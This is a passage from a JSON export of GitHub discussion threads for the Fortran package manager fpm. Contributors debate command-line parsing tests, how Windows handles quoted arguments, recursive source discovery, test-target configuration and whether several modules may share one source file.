have many modules in them so I hope that is not a limitation."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-24 14:48:49+00:00",
                    "text": "A test of a command line parser that does not actually use the command line interface would be incomplete. I could just call the CLI parser directly but that would not check the use of the intrinsics for getting the command line arguments which can be quite different even in a single programming environment.\n\nThis is a fair point however one of the advantages of separating functionality into packages is that testing can be separated along the same lines. For example M_CLI2 is responsible for defining an abstraction that interfaces with get_command_argument intrinsics etc.; therefore testing at this level should occur within the M_CLI2 package (I assume it already does) and packages using M_CLI2 need only test what they implement atop M_CLI2. This ideally takes the form of 'short-circuiting' the get_command_argument intrinsic.\nI don't really object to the recursive execution with namelist file, this is a neat end-to-end testing solution; my comment was referring to why this couldn't be implemented within the existing test framework like test_manifest.f90, test_toml.f90 and test_source_parsing.f90. I believe it is possible, but with some complication regarding where the existing parse() method will go. The existing test framework nicely defines test suites with self-contained tests that are easy to interpret.\n\nI would find fpm unuseable if it can only handle one test file. I have projects that require hundreds, especially ones that have many modules in them so I hope that is not a limitation.\n\nThis is not the intended behaviour for fpm as has been discussed in #164. This may be a bug or unimplemented feature in bootstrap fpm."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-24 16:07:55+00:00",
                    "text": "The bootstrap fpm should support multiple test executables, I have multiple in order to test the IO parts of iso_varying_string. I'll see if I can spare some time today to look more closely at the failure. It seems it must be something Windows specific, since the other OS's are passing."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-24 17:28:24+00:00",
                    "text": "As I suspected, Windows paths were mucking things up again. I fixed that, and now it looks like there are legitimately a couple failing tests in the CLI on Windows."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-24 17:39:20+00:00",
                    "text": "It looks like something having to do with the way Windows deals with spaces in command line arguments being ... problematic. I think you have to use double quotes (IIRC).\nSee this question I once asked on Stack Overflow for some additional background and to start you down the rabbit hole: https://stackoverflow.com/questions/43813677/escaping-spaces-in-windows"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-24 19:01:24+00:00",
                    "text": "It looks like you clobbered my build fix. Would you like me to re-push it?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 19:20:22+00:00",
                    "text": "Seems like it is having trouble with the Shake system again.  I can remove the test and put the files back in the top directory as I think the problem in test17 is likely due with the way quoting is done on MSWindows or arguments are passed to an executable and unfortunately I do not have a programming environment on an MSWindows machine; I have access to a CygWin environment but it ran there.  Using a PR to debug is a bit tough, especially as the most I can get to display in Firefox on Redhat is three lines at a time of the log file.  This is getting too slow to proceed at this point. Disappointing, as I think we are well within the reach of having a functional Fortran fpm sans the network-related functionality."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 19:25:38+00:00",
                    "text": "Did not see the comment. Yes, I did not release pushing out another version would clobber your changes. Not sure what I do to avoid that as I thought your change was independent of this PR. I am quite curious what a debug run with the changes I just added would show, as not that familiar with MSWindows as a programming platform. This is the kind of stuff the test was intended to find, even if I did not expect any (M_CLI2 is a subset of code that has been used for years in hundreds of codes on many Unix and Linux systems. That is why you test I guess :>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-24 19:47:40+00:00",
                    "text": "A force push generally means you're about to clobber something. In the case that someone has made changes on the branch, general practice is to do git pull --rebase before git push. I'll get it back."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 19:54:00+00:00",
                    "text": "Read the stack overflow descriptions. I think the headache will pass; but I might have to tweek M_CLI2 to detect the OS; just having trouble figuring out how it will work in Powershell versus MSWindows CLI mode versus called from a .bat file, etc. Thanks for the link. It would have been particularly confusing without knowing MSWindows was confused in the first place."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-24 20:16:36+00:00",
                    "text": "No problem. We're super close."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-25 00:58:36+00:00",
                    "text": "I have been using a line-mode command called git-pull-request that a friend swears by, and the --force appears to be built in so I need to figure out how to do this manually;  the MSWindows quoting issue is bizarre. I may have to build a programming environment on an MSWindows machine to see if I can sort it out. I got diffferent issues with quoting using simple scripts in PowerShell and a cmd window with a .bat file and from calling a program I built in Cygwin from a cmd window (works fine in CygWin window). And having problems with the website from my browser. It looks like test15 worked which if the code I think is pushed there is there should be having the same issue. Really hard to look at. That is an outlier case I would like to just comment out and solve as a seperate issue. Wondering if the PC version of the Haskell version has any issues with arguments with spaces in an --args option and if not that might be a good clue. Can you just comment those tests out for now if that is simple? I would really like to get this moving and work on the changes in the \"NEW\" PR and get a basic functioning fortran version for simple local cases available and have something I think everyone case work with in that \"NEW\" PR."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-25 01:12:16+00:00",
                    "text": "Ok, that should fix it. I'm good with going ahead and merging this and opening an issue to deal with the Windows side later. I'll give everybody else a day to veto that before actually doing so though."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-25 02:04:34+00:00",
                    "text": "Great. Thanks!"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-25 06:27:30+00:00",
                    "text": "Sorry, late to the party. I might be able to give a hint on the Windows issue. You can't escape using single quotes on the command line on Windows. Both failing tests, 13 and 17 are escaping their whitespace with single quotation marks / apostrophes, if I'm not mistaken."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-25 07:33:47+00:00",
                    "text": "It does indeed work, see: e0f9499 and the corresponding Windows test:\nSTART:  TEST 17 CMD=test proj1 p2 project3 --release -- arg1 -x \"and a long one\"\n arguments seen directly by program\n0[test]\n0[proj1]\n0[p2]\n0[project3]\n0[--release]\n0[--]\n0[arg1]\n0[-x]\n0[and a long one]\n\n\nNote, j is the counter for the loop and i used uninitialized here, therefore we get zeros instead of useful numbers:\n\n  \n    \n      fpm/fpm/test/cli_test/cli_test.f90\n    \n    \n        Lines 168 to 171\n      in\n      af6fa0d\n    \n    \n    \n    \n\n        \n          \n           do j=1,command_argument_count() \n        \n\n        \n          \n              call get_command_argument(number=j,value=big_argument,length=ilen) \n        \n\n        \n          \n              write(*,'(*(g0))')i,'[',big_argument(:ilen),']' \n        \n\n        \n          \n           enddo \n        \n    \n  \n\n\n\n\nThe only drawback is that the CLI will fail consistently for all OS, which might look like a step back on first sight. The problem is that the namelist is reading single quotes over double quotes, and therefore mismatches the simple equals test at\n\n  \n    \n      fpm/fpm/test/cli_test/cli_test.f90\n    \n    \n         Line 126\n      in\n      af6fa0d\n    \n    \n    \n    \n\n        \n          \n           call test_test('ARGS',act_args.eq.args) \n        \n    \n  \n\n\nwith the input\n-'arg1' -x 'and a long one'\n+\"arg1\" -x \"and a long one\"\nI tried to fix it by changing the delim argument for the namelist IO, but this doesn't help."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-09-25 10:52:47+00:00",
                    "text": "I was intrigued by this and therefore (a bit of procrastination ;)) I\nconcocted a small test program and ran that on the following platforms:\n\n   - Linux (gfortran and Intel Fortran)\n   - plain Windows (Intel Fortran)\n   - Cygwin (gfortran)\n   - MinGW (gfortran)\n\nI used the following commands:\n\ncmdline.exe A B C D\ncmdline.exe 'A B C D'\ncmdline.exe \"A B C D\"\ncmdline.exe '*.f90'\ncmdline.exe \"*.f90\"\n\nThe results are, well, interesting. The details are contained in the\nattached zip-file (tstcmdline is a simple shell script, rename it to\ntestcmdline.bat for Windows - gmail did not accept in the zip-file).\n\nThe short message: Linux and Cygwin essentially work in the same way, MinGW\nexpands the file mask in the fourth command and Windows  and MinGw do not\ngroup on  apostrophes, only on quotation marks.\n\nOp vr 25 sep. 2020 om 11:43 schreef Laurence Kedward <\nnotifications@github.com>:\n\u2026\n ***@***.**** approved this pull request.\n\n Thanks again @urbanjost <https://github.com/urbanjost>. This looks good.\n +1 to merge so that #188 <#188>\n can move forward with review.\n Please open an issue to document the windows command line problems when\n you get a chance.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#182 (review)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR6AS7SPKQMOTYIPQFDSHRQ3VANCNFSM4RT2CWCQ>\n ."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-25 13:30:52+00:00",
                    "text": "@awvwgk , if I understand correctly, the namelist read (or maybe write) does not preserve quotes in a string? So in order to preserve a string round-trip, one must use single quotes (')?\n@awvwgk and @arjenmarkus, this behavior matches what I believed was happening, Windows cmd environment (and I think batch behaves the same way) does not respect single quotes. Therefore, the CLI was properly parsing what Windows cmd had provided to it as the arguments, it just wasn't matching what the test expected.\nDoes this effectively lead us to contradicting requirements? The test requires the use of single quotes to preserve the arguments round trip through namelist, but Windows requires the use of double quotes to preserve the string as being a single argument. Is there a workaround we'd like to try and implement before merging, or should we go ahead and merge and just leave this as a known issue?\nThanks @awvwgk and @arjenmarkus for your help fleshing this out."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-25 14:21:16+00:00",
                    "text": "@awvwgk , if I understand correctly, the namelist read (or maybe write) does not preserve quotes in a string?\n\nThe short, but incorrect, answer is yes. The correct answer is that the namelist write step does not know about the type of quotation due to the recursive execution of the test binary and therefore cannot preserve anything.\n\nSo in order to preserve a string round-trip, one must use single quotes (')?\n\nNo, this is actually the wrong conclusion. The assumption that we can use single quotes (') in a cross platform application is wrong. Also the assumption that we can compare a command line by equality in the testsuite is not correct.\n\n@awvwgk and @arjenmarkus, this behavior matches what I believed was happening, Windows cmd environment (and I think batch behaves the same way) does not respect single quotes. Therefore, the CLI was properly parsing what Windows cmd had provided to it as the arguments, it just wasn't matching what the test expected.\n\nThat is indeed correct. Single quotes are officially not supported to escape arguments in PowerShell and CMD on Windows. Note that testing cygwin on Windows introduces a POSIX shell, which will mitigate the problem, therefore cygwin is consistent with OSX and Ubuntu in the testsuite.\n\nDoes this effectively lead us to contradicting requirements?\n\nNo, the assumption for writing the test suite is assuming a POSIX shell and relying on an implementation detail of the namelist IO with GCC (and possibly other compilers as well) to always use single quotation marks.\n\nIs there a workaround we'd like to try and implement before merging, or should we go ahead and merge and just leave this as a known issue?\n\nMy opinion on this is that the implementation is not portable and should be fixed before being merged. I gave it a try already, but I cannot find a simple way to fix the quotation mark issue since this information is just lost in the shell execution and the subsequent usage of namelist IO."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-25 16:27:02+00:00",
                    "text": "Just a point of clarification, which part of \"the implementation is not portable\"? If it is just the tests that are not portable, I think merging now and finding a different testing method later is acceptable. The other tests are sufficiently demonstrating the CLI to be working properly (or at least sufficiently for current requirements), and even the non-portable tests are demonstrating that it works under environments that preserve the intended behavior of the tests.\nIn my opinion, I don't think the CLI should be required to recombine \"erroneously split\" arguments. I think trying require a CLI to \"fix\" \"improperly\" split command line arguments in Windows environments would be akin to trying to ask it to \"fix\" \"improperly\" expanded glob (i.e. *.f90) arguments from a posix environment. It's just out of scope. It seems to me the current implementation is behaving as expected.\nUnless I missed something."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-25 17:18:46+00:00",
                    "text": "Yeah, the test suite is not portable.\nThe PR is already lengthy and we can probably fix this later, of course."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-25 19:31:26+00:00",
                    "text": "I have a change that I think satisfies all the suggest changes and makes a test case I believe will work on MSWindows and POSIX platforms for all but edge conditions, with a change that should allow handling the edge conditions in the future. The -- ARGS option is intriguingly difficult on and MSWindows box. I have a test case I am working on for the case where the arguments are all the printable ASCII characters and the results are \"interesting\" with % characters in particular on windows. Since in this case the shell should have expanded most of the problem characters when the fpm command itself was called I find it difficult to find any kind of typical usage that this version fails on so far.  I tried a simple rebase to avoid clobbering things again and apparently did not get the syntax right so I am hesitant to push this and it seems like a concensus is near. Should I just let this one lay aside for a moment and present this in #188 or I need help on how to make sure another push does not good changes out I am afraid. Suggestions?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-25 20:22:22+00:00",
                    "text": "So long as you made the commit on this branch, you should be able to run the commands\ngit pull --rebase\ngit push\n\nand it should work fine. If not I should be able to recover anything lost and get it sorted out."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-25 21:07:42+00:00",
                    "text": "Well that was interesting. It did not work that simply as I had followed some web pages earlier trying to get past some of the earlier issues that required me to try to try something more involved; and I was following some git directions and got some interesting messages and then my machine crashed and now all but the ubuntu test have been running a long time without completing. I am not going to try anything else."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-25 21:21:31+00:00",
                    "text": "Ok, that looks like it clobbered, pretty much everything. I'm going to force push back to the latest state I had. Any chance you could redo the the changes you made?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-25 22:40:03+00:00",
                    "text": "Managed to break git(1). restoring from system backup. The web page seems to have a page from a previous file in the NEW PR that was never in the CLI branch."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-26 03:12:03+00:00",
                    "text": "The restore is complete, but need to take you up on that offer to reinstall you changes. I have no intention of changing it again unless there is something I do not see that did not restore."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 18:32:35+00:00",
                    "text": "I restored everything. One more time?\n\u2026\n     On 09/25/2020 5:21 PM Brad Richardson ***@***.***> wrote:\n\n\n\n\n     Ok, that looks like it clobbered, pretty much everything. I'm going to force push back to the latest state I had. Any chance you could redo the the changes you made?\n\n     \u2014\n     You are receiving this because you were mentioned.\n     Reply to this email directly, view it on GitHub #182 (comment) , or unsubscribe https://github.com/notifications/unsubscribe-auth/AHDWN3J5T44KP2XROUI3TDLSHUCWRANCNFSM4RT2CWCQ ."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 19:27:53+00:00",
                    "text": "It makes it clear to me that there are disadvantages to Fortran only supporting the equivalent of system(3c) and not the exec(3c) familiy of C routines. Being required to call the system and thus exposing any spawned command to the vagaries of the OS shell and subsequent expansion and globbing makes it much harder to write a reliably portable program using subprocesses; especially because of the number of variations in MSWindows where escaping with ^ is not always reliable, and sometimes \\ is used and that the program might be running in several environments with different parsing rules. Changing the M_CLI2 interface to \" instead of ' makes this reasonably portable without having to determine the OS, but staying with a pure Fortran solution (ie. without calling C) the best solution seems to not requote the parameters as M_CLI2 does in this case, but to use the values directly obtained from the get_command_arguments(3f) function and conditionally requote them based on the system being called by execute_system_command(3f) for outliers with special characters which I will try to capture as a remaining issue, but specifically specifying the DELIM for the sake of the NAMELIST group tests and changing to a \" from a ' seems to be doing a better job than many MSWindows commands and other packages. This experience helps justify the full round-trip test as only being exposed to the system parsing exposes the problem, on the bright side.\n\u2026\n     On 09/25/20I20 9:31 AM Brad Richardson ***@***.***> wrote:\n\n\n\n\n     @awvwgk https://github.com/awvwgk , if I understand correctly, the namelist read (or maybe write) does not preserve quotes in a string? So in order to preserve a string round-trip, one must use single quotes (')?\n\n     @awvwgk https://github.com/awvwgk and @arjenmarkus https://github.com/arjenmarkus , this behavior matches what I believed was happening, Windows cmd environment (and I think batch behaves the same way) does not respect single quotes. Therefore, the CLI was properly parsing what Windows cmd had provided to it as the arguments, it just wasn't matching what the test expected.\n\n     Does this effectively lead us to contradicting requirements? The test requires the use of single quotes to preserve the arguments round trip through namelist, but Windows requires the use of double quotes to preserve the string as being a single argument. Is there a workaround we'd like to try and implement before merging, or should we go ahead and merge and just leave this as a known issue?\n\n     Thanks @awvwgk https://github.com/awvwgk and @arjenmarkus https://github.com/arjenmarkus for your help fleshing this out.\n\n     \u2014\n     You are receiving this because you were mentioned.\n     Reply to this email directly, view it on GitHub #182 (comment) , or unsubscribe https://github.com/notifications/unsubscribe-auth/AHDWN3L5FB6GELSDPICF4H3SHSLR3ANCNFSM4RT2CWCQ ."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-27 20:32:37+00:00",
                    "text": "Despite the git related hiccups, this is now working (\ud83d\ude04), so I'm going to go ahead and merge. Thanks for all your effort on this @urbanjost"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 21:52:17+00:00",
                    "text": "Thank you!  Thanks everyone for all the support an suggestions\n\u2026\n     On 09/27/2020 4:32 PM Brad Richardson ***@***.***> wrote:\n\n\n\n\n     Despite the git related hiccups, this is now working (\ud83d\ude04), so I'm going to go ahead and merge. Thanks for all your effort on this @urbanjost https://github.com/urbanjost\n\n     \u2014\n     You are receiving this because you were mentioned.\n     Reply to this email directly, view it on GitHub #182 (comment) , or unsubscribe https://github.com/notifications/unsubscribe-auth/AHDWN3JG5ZMOEEQGA72736TSH6OPFANCNFSM4RT2CWCQ ."
                }
            ]
        },
        {
            "number": 181,
            "user": "urbanjost",
            "date": "2020-09-19 22:01:23+00:00",
            "title": "simple CLI interface for all commands using M_CLI2",
            "text": "An implimentation of a CLI interface based on the most\nrecent master for discussion with @everythingfunctional",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-19 23:08:26+00:00",
                    "text": "Thanks!\n\u2026\nOn Sat, Sep 19, 2020, at 5:01 PM, urbanjost wrote:\n An implimentation of a CLI interface based on the most\n recent master for discussion with @everythingfunctional\n <https://github.com/everythingfunctional>\n\n You can view, comment on, or merge this pull request online at:\n\n   #181\n\n Commit Summary\n\n  * simple CLI interface for all commands using M_CLI2\n File Changes\n\n  * *M* fpm/fpm.toml\n <https://github.com/fortran-lang/fpm/pull/181/files#diff-7b7f15ad033448e9fa834a26171257de> (3)\n  * *M* fpm/src/fpm.f90\n <https://github.com/fortran-lang/fpm/pull/181/files#diff-e235e41ae1a801d1ff11bfa3aa1ea6db> (133)\n  * *M* fpm/src/fpm_command_line.f90\n <https://github.com/fortran-lang/fpm/pull/181/files#diff-7fc26592b0babf0895d006b372f1ec37> (192)\n Patch Links:\n\n  * https://github.com/fortran-lang/fpm/pull/181.patch\n  * https://github.com/fortran-lang/fpm/pull/181.diff\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#181>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWDWKG2RRQMA37KSDADSGUS37ANCNFSM4RTICRKQ>."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-20 01:55:37+00:00",
                    "text": "It says it fails on a file that was a working file on windows that ends in \".f90.\".  I added the dot to keep it from being used, which worked on Linux.  I deleted the file, it is just fodder for a new demo. Interesting it picked up that file even though it did not end in \".f90\". Not sure if how the checks work; if it will pull a new dependency and run again or not."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-20 06:58:07+00:00",
                    "text": "Thanks @urbanjost. The error was a Windows/git error; it is illegal for a filename to end in a dot on Windows so the git checkout failed. I've rerun the checks and all seems fine now.\nI will look over this PR today"
                }
            ]
        },
        {
            "number": 180,
            "user": "LKedward",
            "date": "2020-09-19 12:57:38+00:00",
            "title": "Recursive source discovery",
            "text": "Updates list_files routine with capability to recursively discover files in subdirectories;\nadd_sources_from_dir now calls list_files in recursive mode;\nUpdates 'hello_complex' example package with additional module in subdirectory to demonstrate and test this.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-19 16:30:03+00:00",
                    "text": "Looks great, thanks!\n\u2026\nOn Sat, Sep 19, 2020, at 8:40 AM, Sebastian Ehlert wrote:\n\n\n ***@***.**** approved this pull request.\n\n Very nice, I did a quick check on `toml-f`, which is using a rather\n deep directory structure, and it was built correctly \ud83d\udc4d. The\n implementation also looks good to me.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#180 (review)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWGTIDTUYYFEU3F34WDSGSYGXANCNFSM4RTAJAFQ>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-20 15:39:45+00:00",
                    "text": "Thank you, @LKedward! Merging."
                }
            ]
        },
        {
            "number": 179,
            "user": "awvwgk",
            "date": "2020-09-18 22:25:57+00:00",
            "title": "Testing with fpm test",
            "text": "Since @milancurcic brought it up in #177 (comment), it might be worth to have a way to define unit tests within a test target, i.e. \u201cexport\u201d tests from our testing framework as test targets to fpm test. I am also thinking of tests that will require external resources, we cannot really define in a unit test.\nAn example is the consistency test of the version number specified in the fpm.toml, meson.build or CMakeLists.txt and the internal one in a *_version module. In this case we would either like to get the correct fpm.toml as argument and parse it or have the build system pass the version string as command line argument. The unit test without arguments will usually be useless. The alternative would be to generate the *_version module with configure_file from a template, but this is nothing we can do with fpm (yet).\nOther examples might be test targets requiring correctly set environment variables or test binaries that can run different tests depending on a test input file. The binary might even be an external program that takes an executable as input and provides it with input by some convention (i.e. STDIN) and expects a correct response (i.e. STDOUT or error code).\nI am facing four different test scenarios with toml-f, for which I am relying on the unit test framework of meson and it does a pretty decent job to orchestrate those different scenarios. Only one of them would be supported by fpm right now. Here are the test definitions for reference: https://github.com/toml-f/toml-f/blob/master/test/meson.build.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-22 02:27:08+00:00",
                    "text": "@awvwgk thanks for the idea. Can you give an example how it could look like from a user perspective for toml-f using fpm?\nI would prefer if things can somehow work automatically so that users don't have to code a file like https://github.com/toml-f/toml-f/blob/cb04d91e55872f390210a63c3468f168c0da4cbd/test/meson.build, which seems quite long. Is the problem in different dependencies for tests?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-22 08:12:40+00:00",
                    "text": "Let's assume fpm would support a configure_file like syntax, a hypothetical transcription of my test definitions for toml-f with fpm could look like this:\n# Check if the internal version number matches the package version number\n[[test]]\nname = \"tftest-version\"\nmain = \"version.f90\"\nsource-dir = \"test\"\n[[test.target]]\nargs = [\"@package-version@\"]  # returns entry from package%version\n\n# Check content of a local file (fpm.toml) for the version number\n# Note: this test is actually redundant for fpm, if the first case works,\n#       meson and CMake currently use this since fpm can't check itself\n[[test]]\nname = \"tftest-fpm\"\nmain = \"fpm.f90\"\nsource-dir = \"test\"\n[[test.target]]\n# given the current scope, the current source directory should be \"test\"\nargs = [\"@fpm-current-source-dir@/../fpm.toml\"]\n# alternatively, if we have a package scope, this might work:\n# args = [\"@fpm-source-dir@/fpm.toml\"]\n\n# This is already valid with fpm\n[[test]]\nname = \"tftester\"\nmain = \"tftest.f90\"\nsource-dir = \"test\"\n\n# Now the complicated part\n# Decoder test, check if the deserialization of TOML documents produces the correct data structures\n[[test]]\nname = \"toml2json\"\nmain = \"toml2json.f90\"\nsource-dir = \"test\"\n[[test.target]]\n# requires an external program to perform testing\nexecutable.find = \"toml-test\"\n# referencing of the test executable is required\nargs = [\n  \"-testdir\", \"@fpm-source-dir@/subprojects/toml-test\",\n  \"@fpm-current-binary-dir@/toml2json\",\n]\n[[test.target]]\nexecutable.find = \"toml-test\"\nargs = [\"@fpm-current-binary-dir@/toml2json\"]\n\n# Encoder test, check if the serialization of data structures produces correct TOML documents\n[[test]]\nname = \"json2toml\"\nmain = \"json2toml.f90\"\nsource-dir = \"test\"\n[[test.target]]\nexecutable.find = \"toml-test\"\nargs = [\"-encoder\", \"@fpm-current-binary-dir@/json2toml\"]\nCertainly, the test definitions won't get much shorted compared to the declarations in the meson.build of toml-f. I actually prefer to be explicit about the declarations.\nFor the sake of the discussion, we can ignore the second half of the tests for now, if they don't fit into fpm's scope of testing (I currently don't support them in CMake as well because they are a bit more involved and so far only meson is able to handle this test scenario gracefully).\nBut supporting the first two scenarios (tftest-version and tftest-fpm) in some way would be great."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-12-23 00:32:01+00:00",
                    "text": "At least for the first scenario, I believe in Cargo it is done using environment variables. Quoting the relevant sections:\n\nCargo exposes these environment variables to your crate when it is compiled. Note that this applies for running binaries with cargo run and cargo test as well. To get the value of any of these variables in a Rust program, do this:\nlet version = env!(\"CARGO_PKG_VERSION\");\n\nversion will now contain the value of CARGO_PKG_VERSION.\n\nIn rust env! is a macro which inspects an environment variable at compile time! Then you just need to assert the environment variable version (coming from the manifest file) is equal to the parameter in your Fortran API.\nFor the second version you could use an environment variable FPM_MANIFEST_DIR.\nFor the remaining cases I have the feeling it can be done with the environment variables:\n\n\nCARGO_BIN_EXE_<name> \u2014 The absolute path to a binary target's executable. This is only set when building an integration test or benchmark. This may be used with the env macro to find the executable to run for testing purposes. The <name> is the name of the binary target, exactly as-is. For example, CARGO_BIN_EXE_my-program for a binary named my-program. Binaries are automatically built when the test is built, unless the binary has required features that are not enabled."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-23 16:40:20+00:00",
                    "text": "The Rust macro processor is quite powerful, but we would have to emulate something like this with fypp or cpp.\nUsing environment variables at runtime would be the (easier) alternative, which again leads to the problem how we to specify those in the package manifest in case we need non-standard information."
                }
            ]
        },
        {
            "number": 178,
            "user": "LKedward",
            "date": "2020-09-18 11:07:31+00:00",
            "title": "Add more example packages",
            "text": "Adds: new example package for including c code;\nAdds: new example package for using submodules;\nAdds: README describing each example package and supported fpm version;\nFixes: parsing bug where submodule names were not added to modules_provided array;\nFixes: parsing bug where leading spaces were not removed from parsed strings.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-18 17:59:47+00:00",
                    "text": "\ud83d\udc4d from me. Do you agree on also adding this example package:\nmodule_in_program_source/\n  app/\n    main.f90\n  fpm.toml\n\nwhere main.f90 is:\nmodule greet_m\n  implicit none\n  character(*), parameter :: greeting = 'Hello, fpm!' \nend module greet_m\n\nprogram module_in_program_source\n  use greet_m, only: greeting\n  implicit none\n  print *, greeting\nend program module_in_program_source\nWe're supporting this implicitly without special care, but we should make sure to not break the support."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-18 18:30:34+00:00",
                    "text": "Thanks @milancurcic. Good point yes I agree, I'll add that example in too."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-18 19:36:46+00:00",
                    "text": "I'm not sure I agree that we do want to support having a module in the same file with a program. We don't support having multiple modules in one file. Is there a reason for wanting this capability?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-18 19:51:48+00:00",
                    "text": "For me it's convenience for toy programs;\nIt's valid Fortran;\nThere is existing production Fortran software that does this (multiple modules in one source file)\n\n\nWe don't support having multiple modules in one file.\n\nWe do, I just tried it. :)\nI get that many people may not care about this, but I think you need a strong argument to disallow valid code."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-18 20:03:08+00:00",
                    "text": "I similarly find it useful now and again to put a module and a program together for small supporting programs like tests, demos and benches. This is fairly common usage I believe.\nMy main quarrel with disallowing this, and other valid fortran layouts, is with the enforcement of design decisions on users by constraint. This is not the job of a build tool IMO.\nRegarding existing support, I believe it is supported to the extent that the module in question is not used by any other file."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-18 21:28:30+00:00",
                    "text": "I find it somewhat useful when tooling (if not the language itself) can at least discourage known, poor design decisions. Similar to the way most modern languages don't have a goto. But if there is sufficient desire, and some use cases where it would lead to better design, I'm ok with it. I don't know if that's the case, but I'm open to being shown some.\nAre there any other languages that allow multiple modules in one file?"
                },
                {
                    "user": "certik",
                    "date": "2020-09-19 16:38:08+00:00",
                    "text": "I agree with Brad. But similarly I am for restricting the naming of modules to enforce directory structure, but if I recall correctly, Brad was against.\n\nThe fact that current codes use something is not a good argument because current codes would require some modifications anyway to compile with fpm.\n\nI think a good way forward is to restrict with an fpm.toml option (we can discuss whether the option should be on or off by default). That way we can satisfy both camps.\n\nI definitely would like an option in fpm to warn against non standard usage.\n\nHuge advantage of being strict is that it simplifies the available options, which makes it easier to understand other people's codebases.\n\u2026\nOn Fri, Sep 18, 2020, at 4:28 PM, Brad Richardson wrote:\n\n\n I find it somewhat useful when tooling (if not the language itself) can\n at least discourage known, poor design decisions. Similar to the way\n most modern languages don't have a `goto`. But if there is sufficient\n desire, and some use cases where it would lead to better design, I'm ok\n with it. I don't know if that's the case, but I'm open to being shown\n some.\n\n Are there any other languages that allow multiple modules in one file?\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#178 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWHVXFLWYQYOSEHW5DLSGPGI3ANCNFSM4RR2MP5A>."
                },
                {
                    "user": "certik",
                    "date": "2020-09-19 16:39:54+00:00",
                    "text": "Regarding quick tests: \"fpm new\" will create you an executable with a module, properly in separate files, so I intend to use that.\n\u2026\nOn Sat, Sep 19, 2020, at 11:37 AM, Ond\u0159ej \u010cert\u00edk wrote:\n I agree with Brad. But similarly I am for restricting the naming of\n modules to enforce directory structure, but if I recall correctly, Brad\n was against.\n\n The fact that current codes use something is not a good argument\n because current codes would require some modifications anyway to\n compile with fpm.\n\n I think a good way forward is to restrict with an fpm.toml option (we\n can discuss whether the option should be on or off by default). That\n way we can satisfy both camps.\n\n I definitely would like an option in fpm to warn against non standard usage.\n\n Huge advantage of being strict is that it simplifies the available\n options, which makes it easier to understand other people's codebases.\n\n On Fri, Sep 18, 2020, at 4:28 PM, Brad Richardson wrote:\n >\n >\n > I find it somewhat useful when tooling (if not the language itself) can\n > at least discourage known, poor design decisions. Similar to the way\n > most modern languages don't have a `goto`. But if there is sufficient\n > desire, and some use cases where it would lead to better design, I'm ok\n > with it. I don't know if that's the case, but I'm open to being shown\n > some.\n >\n > Are there any other languages that allow multiple modules in one file?\n >\n > \u2014\n > You are receiving this because you are subscribed to this thread.\n > Reply to this email directly, view it on GitHub\n > <#178 (comment)>,\n > or unsubscribe\n > <https://github.com/notifications/unsubscribe-auth/AAAFAWHVXFLWYQYOSEHW5DLSGPGI3ANCNFSM4RR2MP5A>.\n >"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-19 18:04:32+00:00",
